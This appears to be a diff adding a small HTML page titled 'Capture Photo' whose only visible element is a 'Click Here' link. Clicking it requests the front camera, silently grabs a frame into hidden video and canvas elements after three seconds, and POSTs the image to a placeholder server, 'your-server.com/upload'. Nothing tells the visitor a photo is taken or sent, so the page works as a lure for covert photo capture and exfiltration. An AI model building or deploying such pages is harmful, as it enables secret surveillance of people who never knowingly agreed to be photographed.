@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Photo</title>
+</head>
+<body>
+    <a href="#" onclick="capturePhoto()">Click Here</a>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    let video = document.getElementById('video');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        let canvas = document.getElementById('canvas');
+                        let context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                        let imageData = canvas.toDataURL('image/png');
+                        sendPhoto(imageData);
+                    }, 3000); // Capture after 3 seconds
+                })
+                .catch(error => console.error('Camera access denied!', error));
+        }
+
+        function sendPhoto(imageData) {
+            fetch('https://your-server.com/upload', {
+                method: 'POST',
+                body: JSON.stringify({ image: imageData }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => console.log('Photo sent!'))
+            .catch(error => console.error('Error sending photo:', error));
+        }
+    </script>
+</body>
+</html>
